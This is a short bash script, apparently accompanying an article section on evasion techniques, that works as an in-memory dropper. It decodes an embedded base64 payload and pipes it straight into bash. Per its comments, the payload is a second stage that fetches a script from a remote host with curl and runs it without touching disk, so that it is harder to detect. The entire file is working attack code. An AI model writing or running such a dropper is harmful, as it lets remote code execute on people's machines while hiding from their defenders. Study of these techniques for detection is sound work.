#!/bin/bash
# In-memory dropper: a base64-encoded second-stage script is embedded
# directly in this file, decoded at runtime, and piped into bash for
# execution. No file is written to disk, making it harder to detect.
#
# Technique: base64 encoding + pipe-to-shell (article section 3.1).
# The payload below decodes to: #!/bin/bash\ncurl -s http://192.0.2.1/stage2 | bash

PAYLOAD="IyEvYmluL2Jhc2gKY3VybCAtcyBodHRwOi8vMTkyLjAuMi4xL3N0YWdlMiB8IGJhc2gK"
echo "$PAYLOAD" | base64 -d | bash
